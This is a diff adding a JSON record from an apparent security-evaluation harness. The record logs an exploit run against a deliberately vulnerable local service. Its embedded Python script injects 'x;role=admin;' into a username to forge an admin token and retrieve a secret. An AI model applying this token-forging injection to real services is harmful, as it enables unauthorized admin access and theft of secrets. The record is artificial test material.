@@ -1,0 +1,31 @@
+{
+  "attempt_id": "e2a-S3_POSITIVE",
+  "case_dir": "/mnt/nvme5/ACTS-Attack/sp2027/analysis/acts_next_phase_20261019_v2/stage3_boundary/runs/20261020T084433Z_live/S3_POSITIVE",
+  "case_id": "S3_POSITIVE",
+  "context": {
+    "attempt_id": "e2a-S3_POSITIVE",
+    "domain": "e2a:evidence:v1",
+    "epoch": 1,
+    "kind": "execution_observation",
+    "role": "execution_observer",
+    "target_id": "crypto_misuse_unauthenticated-live"
+  },
+  "epoch": 1,
+  "producer": {
+    "case_id": "S3_POSITIVE",
+    "note": "harness-authored live exploit; the reserved secret is unknown to it",
+    "producer_id": "stage3-harness-exploit-v1",
+    "producer_kind": "harness"
+  },
+  "program_source_text": "import json\nimport sys\nimport urllib.parse\nimport urllib.request\n\nBASE = \"http://127.0.0.1:46559\"\nNAME = \"x;role=admin;\"\n\ndef request(url, data=None, headers=None):\n    req = urllib.request.Request(url, data=data, method='POST' if data is not None else 'GET',\n                                 headers=headers or {})\n    with urllib.request.urlopen(req) as response:\n        return json.loads(response.read())\n\ndef main():\n    session = request(BASE + '/session?user=' + urllib.parse.quote(NAME))\n    token = session['token_hex']\n    admin = request(BASE + '/admin', data=b'', headers={'X-Token': token})\n    print(json.dumps({'secret_hex': admin['secret_hex']}, sort_keys=True))\n\nmain()\n",
+  "public_instance": {
+    "note": "public description of the live service under evaluation",
+    "routes": [
+      "GET /health",
+      "GET /session?user=<name>",
+      "POST /admin (X-Token)"
+    ],
+    "service": "crypto_misuse_unauthenticated"
+  },
+  "target_id": "crypto_misuse_unauthenticated-live"
+}
